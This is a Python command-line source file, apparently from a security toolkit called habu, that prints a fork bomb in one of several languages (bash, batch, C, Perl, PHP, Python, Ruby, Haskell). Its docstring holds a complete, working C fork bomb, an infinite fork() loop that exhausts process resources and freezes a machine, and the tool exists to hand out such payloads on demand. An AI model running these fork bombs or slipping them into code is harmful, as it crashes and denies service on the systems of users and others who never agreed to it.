#!/usr/bin/env python3

import click

from habu.lib.forkbomb import bombs, get_bomb


@click.command()
@click.argument('bomb', type=click.Choice(bombs))
def cmd_forkbomb(bomb):
    """A shortcut to remember how to use fork bombs in different languages.

    Currently supported: bash, batch, c, haskell, perl, php, python, ruby.

    Example:

    \b
    #include <unistd.h>
    int main()
    {
        while(1)
        {
            fork();
        }
        return 0;
    }
    """

    print(get_bomb(bomb), end='')

if __name__ == '__main__':
    cmd_forkbomb()
